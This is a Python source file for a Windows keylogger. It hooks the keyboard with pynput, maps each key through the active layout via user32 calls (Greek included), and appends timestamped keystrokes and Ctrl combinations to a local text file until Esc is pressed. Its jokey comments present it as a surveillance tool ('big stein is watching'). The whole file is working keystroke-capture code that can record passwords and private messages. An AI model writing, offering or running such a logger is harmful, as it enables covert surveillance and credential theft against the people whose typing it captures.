import pynput.keyboard as keyboard
import ctypes
import time
#big stein is watching 

log_name = "captured_keys.txt"
u32 = ctypes.windll.user32 # shortenin this so i dont have to type it every time

def save_it(data):
    # Need utf-8 here otherwise the Greek letters turn into gibberish type shi
    with open(log_name, "a", encoding="utf-8") as file:
        file.write(data)

def get_real_char(vk, shift, caps):
    hwnd = u32.GetForegroundWindow()
    pid = u32.GetWindowThreadProcessId(hwnd, 0)
    layout = u32.GetKeyboardLayout(pid)
    kb_state = (ctypes.c_uint8 * 256)()
    u32.GetKeyboardState(kb_state)
    
    # force shift and caps lock state bla bla bla (baal knowledge)
    if shift:
        kb_state[0x10] = 0x80 # VK_SHIFT
    else:
        kb_state[0x10] = 0x00
        
    if caps:
        kb_state[0x14] = 0x01 # VK_CAPITAL
    else:
        kb_state[0x14] = 0x00

    scan = u32.MapVirtualKeyExW(vk, 0, layout)
    buf = ctypes.create_unicode_buffer(8)
    res = u32.ToUnicodeEx(vk, scan, kb_state, buf, 8, 0, layout)
    if res > 0:
        return buf.value
    return None
  
def on_press(key):
    t = time.strftime("%H:%M:%S")
    
    try:
        # check if control is held
        ctrl = (u32.GetAsyncKeyState(0x11) & 0x8000) != 0

        # skip modifier keys so the text file isnt full of them
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.caps_lock:
            return
        # handle other special keys like enter, space, etc
        if isinstance(key, keyboard.Key):
            save_it(f"[{t}] [{key.name}]\n")
            print(f"[{key.name}]") 
            return
        vk_code = None
        if hasattr(key, 'vk') and key.vk != None:
            vk_code = key.vk
        elif hasattr(key, 'value') and hasattr(key.value, 'vk'):
            vk_code = key.value.vk
        
        if vk_code != None:
            if ctrl:
                # CTRL + whatever
                if 65 <= vk_code <= 90:
                    letter = chr(vk_code)
                else:
                    letter = str(vk_code)
                out = f"[CTRL+{letter}]"
            else:
                # check real hardware states for shift and caps
                shift_down = (u32.GetAsyncKeyState(0x10) & 0x8000) != 0
                caps_on = (u32.GetKeyState(0x14) & 0x0001) != 0
                
                real_char = get_real_char(vk_code, shift_down, caps_on)
                
                if real_char != None:
                    # Universal XOR logic for all letters
                    if real_char.isalpha():
                        if caps_on ^ shift_down:
                            out = real_char.upper()
                        else:
                            out = real_char.lower()
                    else:
                        # numbers or symbols
                        out = real_char
                else:
                    out = f"[{vk_code}]"
            save_it(f"[{t}] {out}\n")
            print(out)

    except Exception as e:
        print("error:", e)
        save_it(f"[{t}] [error]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("stopping...")
        return False

if __name__ == "__main__":
    print("Starting logger... press esc to stop")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
        l.join()

# megas alekasndros IQ room temperature type shi 
